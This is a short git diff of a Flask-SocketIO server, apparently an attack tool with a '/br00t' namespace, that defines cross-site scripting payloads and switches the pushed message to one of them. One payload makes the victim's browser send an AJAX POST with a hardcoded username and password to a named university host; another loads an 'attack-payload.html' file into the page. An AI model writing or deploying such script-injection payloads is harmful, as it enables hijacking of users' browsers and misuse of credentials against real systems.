@@ -10,11 +10,13 @@ app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app)
 thread = None
 
-user = 'devera'
+target_user = 'devera'
+target_url = 'storm.cis.fordham.edu'
 password = 'troisetudes'
 
 ping_payload = 'ping<script>console.log("hello world");</script>'
-ssh_ping_payload = '<script>$.ajax({url: $(this).attr("action"),type: "POST",data: $(this).serialize(),username:'+user+',password: '+password+',success: function(data){console.log(data);},});</script>'
+ssh_ping_payload = '<script>$(document).ready(function(){$.ajax({url: '+ target_url +',type: "POST",data: $(this).serialize(),username:'+target_user+',password: '+password+',success: function(data){console.log(data);},});});</script>'
+bitch_payload = '<script>$(document).ready(function(){$("#toggle-mon").load("../static/php/attack-payload.html");});'
 
 def background_thread():
     """Example of how to send server generated events to clients."""
@@ -28,7 +30,7 @@ def background_thread():
         socketio.emit('my response',
                       {'data': header},namespace='/br00t')
         socketio.emit('my response',
-                      {'data': ping_payload},namespace='/br00t')
+                      {'data': ssh_ping_payload},namespace='/br00t')
 
 
 @app.route('/')
